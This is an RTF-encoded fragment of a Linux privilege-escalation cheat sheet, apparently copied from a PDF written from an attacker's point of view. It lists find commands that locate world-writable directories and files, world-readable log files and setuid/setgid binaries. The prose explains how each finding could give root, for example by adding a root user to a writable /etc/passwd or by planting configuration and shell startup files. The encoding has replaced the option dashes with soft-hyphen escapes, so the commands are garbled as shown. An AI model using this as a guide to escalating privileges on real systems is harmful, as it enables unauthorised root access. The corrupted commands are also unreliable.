\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Stolen from: http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf}
\par\plain {\f0\fs24\b0\i0 World }
\par\plain {\f0\fs24\b0\i0 writable }
\par\plain {\f0\fs24\b0\i0 directories}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Find word writable folders outside your home directory. It would be a tremendous success if we could write, say to /etc. So we could add configuration files and therefore pretty sure execute code as root, since many daemons read a specific number of primary and secondary configuration files, whereas the secondary ones are often not created yet. If the superusers home (/root) would be writable, we could create shell startup files that doesn't exist yet: .profile, }
\par\plain {\f0\fs24\b0\i0 .bash_profile, .bashrc...}
\par\plain {\f0\fs24\b0\i0 find / \\( \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADwholename }
\par\plain {\f0\fs24\b0\i0 '/home/homedir/*' \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADprune \\) \u173\'ADo \\}
\par\plain {\f0\fs24\b0\i0 ( \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADtype d \u173\'ADperm \u173\'AD0002 \\) \u173\'ADexec }
\par\plain {\f0\fs24\b0\i0 ls \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADld '\{\}' ';' 2>/dev/null}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 World }
\par\plain {\f0\fs24\b0\i0 writable files}
\par\plain {\f0\fs24\b0\i0 What if /etc/passwd would be writable? Yeah, we just could add another root user and we would have won! Whereas the foregoing scenario is just too good to be }
\par\plain {\f0\fs24\b0\i0 true, it really makes sense to search for world writable files outside your own territory (= your home directory).}
\par\plain {\f0\fs24\b0\i0 find / \\( \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADwholename }
\par\plain {\f0\fs24\b0\i0 '/home/homedir/*' \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADprune \u173\'ADo }
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADwholename '/proc/*' \u173\'ADprune \\) }
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADo \\( \u173\'ADtype f \u173\'ADperm \u173\'AD0002 \\) }
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADexec ls \u173\'ADl '\{\}' ';' 2>/dev/null}
\par\plain {\f0\fs24\b0\i0 Logfiles}
\par\plain {\f0\fs24\b0\i0 Sometimes a security unaware administrator chmods a sensitive log file, because he couldn't view it and therefore leaks potentially sensitive data such as }
\par\plain {\f0\fs24\b0\i0 passwords or other important information.}
\par\plain {\f0\fs24\b0\i0 find /var/log \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADtype f \u173\'ADperm }
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u173\'AD0004 2>/dev/null}
\par\plain {\f0\fs24\b0\i0 Setuid / setgid files}
\par\plain {\f0\fs24\b0\i0 We already examined fully why setuid and setgid files are worth to be double checked. Such a file owned by root and susceptible for attacks is a big weakness.}
\par\plain {\f0\fs24\b0\i0 find / \\( \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADtype f \u173\'ADor \u173\'ADtype d \\)}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u173\'ADperm \u173\'AD6000 2>/dev/null}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0}